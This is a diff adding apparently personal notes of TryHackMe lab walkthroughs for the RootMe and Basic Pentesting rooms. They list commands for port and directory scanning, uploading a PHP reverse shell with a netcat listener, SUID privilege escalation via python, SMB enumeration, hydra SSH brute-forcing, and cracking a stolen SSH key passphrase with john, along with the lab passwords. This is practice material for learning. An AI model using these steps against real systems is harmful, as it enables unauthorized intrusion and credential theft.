@@ -1,0 +1,92 @@
+HACKS FOR VARIOUS ROOMS IN TryHackME.
+-------------------------------------
+
+1.ROOTME
+--------
+
+nmap -T4 -p- -A <IP> enumerate the machine to discover open ports
+
+sudo gobuster dir -u 10.10.249.179 -w /usr/share/wordlists/dirb/big.txt [directory busting, hidden directories - of interest is the /panel/ and /uploads]
+
+upload a php reverse shell exploit (edit the IP on which the server will connect back to)
+
+set up a netcat listener and get a shell. [ nc -lvnp 12345] - pops a reverse shell
+
+nmap -T4 -p- -A <ip>
+
+find -name user.txt
+
+find -user root -perm /4000 2>/dev/null
+
+/usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")' [GTFO BINS, PRIVESC exploits]
+
+
+
+
+2.BASIC PENTESTING ROOM 
+------------------------
+
+THE HACKERSPLOIT WAY...
+------------------------
+
+From nmap, open ports: 80, 8080, 8009, 22, 139 and 445.
+Samaba smbd is running on port 139 and 445
+OpenSSH 7.2p2 on port 22 is usually vulnerable to username enum.
+
+sudo nmap -p80 --script http-enum 10.10.5.72 
+
+To further enum the SMB, we shall use the enume4linux to get any shares available.
+enum4linux -a 10.10.5.72
+-share names returned: Anonymous and IPC
+
+Try using msb client to log in tto the share.
+smbclient  //<IP>/Anonymous
+smbclient //<IP>/ipc$
+
+dir [this gets us some listings in this share, including a staff.txt file. We get the two user names here, J and K]
+
+hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.5.72 -I [bruteforce with hydra]
+
+this bruteforce gives us a gold mine! jan's password which we can then use to log onto the machine via SSH. [armando is the passwd btw]
+
+cd to kay user account.
+under the .ssh dir, we find their public and private keys. copy the private key.
+Make the file executable, chmod +x id_rsa
+ssh -i id_rsa kay@10.10.5.72 
+
+oh no! This private key has a pass phrase!
+
+No worries, we'll crack using john!
+
+locate ssh2john
+cd /usr/share/john/
+./ssh2jon.py 
+
+sudo ./ssh2john.py ~/Desktop/THM/id_rsa > ~/Desktop/THM/hash.txt 
+
+nice! the hash starts with $1$. Really? is security a joke to you?? MD5? Disappointing. 
+Let's just get over with, JohnTheRipper will do.
+
+sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz  [run in the same dir as hash.txt]
+voila! beesewax! caution
+
+THE JOHN HAMMOND WAY.
+---------------------
+
+nmap as usual.
+
+sudo gobuster dir -u 10.10.249.179 -w /usr/share/wordlists/dirb/big.txt
+/development - dir of interest
+
+enumerate the SMB with enum4linux
+enum4linux -a <TARGET IP> | tee enum4linux.log   > to save the log file
+this scan gives us the two users, J and K.
+
+From the dev notes, we know that J has a weak passwd. This should be our way in.
+
+
+
+
+
+
+u
